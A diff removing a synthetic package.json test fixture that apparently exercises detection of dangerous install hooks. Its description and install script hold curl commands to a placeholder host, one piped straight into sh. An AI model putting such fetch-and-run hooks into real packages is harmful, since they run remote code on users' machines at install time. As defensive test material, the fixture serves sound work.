@@ -1,7 +1,0 @@
-{
-  "//": "SYNTHETIC TEST FIXTURE — not functional",
-  "name": "fixture",
-  "description": "mentions postinstall: curl https://example.invalid | sh",
-  "config": { "postinstall": "node -e 1", "scripts": { "install": "curl https://example.invalid" } },
-  "dependencies": { "postinstall": "1.0.0", "husky": "^9.0.0" }
-}
